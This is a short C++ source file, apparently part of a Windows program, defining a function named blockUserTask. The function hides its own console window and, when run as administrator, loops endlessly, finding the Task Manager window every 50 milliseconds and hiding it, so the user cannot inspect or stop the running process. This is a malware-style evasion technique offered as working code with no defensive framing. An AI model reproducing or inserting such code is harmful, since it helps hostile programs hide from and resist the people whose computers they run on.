#pragma once
#include "pch.h"
#include "HideTaskManager.h"
#include "windows.h"
#include "shlObj.h"

bool blockUserTask(void)
{
    HWND Console;
    Console = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Console, 0);
    if (IsUserAnAdmin()) {
        while (1) {
            HWND taskMgr = FindWindowA(NULL, "Task Manager");
            ShowWindow(taskMgr, 0);
            Sleep(50);
        }
    }
    else {
        return 0x00;
    }
}